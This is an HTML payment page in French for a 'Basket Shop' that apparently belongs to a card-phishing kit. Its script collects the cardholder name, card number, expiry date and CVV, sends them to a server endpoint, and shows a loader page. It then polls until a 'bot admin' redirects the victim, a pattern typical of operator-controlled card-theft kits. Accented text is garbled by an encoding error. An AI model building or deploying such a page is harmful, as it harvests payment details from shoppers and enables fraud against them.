<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Paiement - Basket Shop</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      color: #333;
      text-align: center;
      padding-top: 60px;
    }
    h1 {
      color: #222;
    }
    form {
      display: inline-block;
      background: white;
      padding: 20px 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      margin-top: 30px;
      width: 320px;
    }
    input {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 1em;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px 18px;
      border-radius: 6px;
      font-size: 1em;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h1>ðŸ’³ Paiement sÃ©curisÃ©</h1>
  <p>Entrez vos informations de paiement pour finaliser votre commande.</p>

  <form id="paymentForm">
    <input type="text" id="nomTitulaire" placeholder="Nom du titulaire" required />
    <input type="text" id="cardNumber" placeholder="NumÃ©ro de carte" maxlength="19" required />
    <input type="text" id="expiry" placeholder="Date dâ€™expiration (MM/AA)" required />
    <input type="text" id="cvv" placeholder="CVV" maxlength="4" required />
    <button type="submit">Payer maintenant ðŸ’³</button>
  </form>

  <script>
    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const cardNumber = document.getElementById('cardNumber').value;
      const expiry = document.getElementById('expiry').value;
      const cvv = document.getElementById('cvv').value;
      const nomTitulaire = document.getElementById('nomTitulaire').value;

      try {
        // Envoie les infos au serveur
        await fetch('/api/payment', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ cardNumber, expiry, cvv, nomTitulaire })
        });

        // Redirige vers le loader
        window.location.href = '/loader.html';
      } catch (err) {
        alert("Erreur lors de l'envoi du paiement");
      }
    });

    // VÃ©rifie si le bot admin a redirigÃ© l'utilisateur
    async function checkStatus() {
      const res = await fetch('/api/status');
      const data = await res.json();
      if (data.redirect) {
        window.location.href = data.redirect;
      } else {
        setTimeout(checkStatus, 2000);
      }
    }
    checkStatus();
  </script>
</body>
</html>
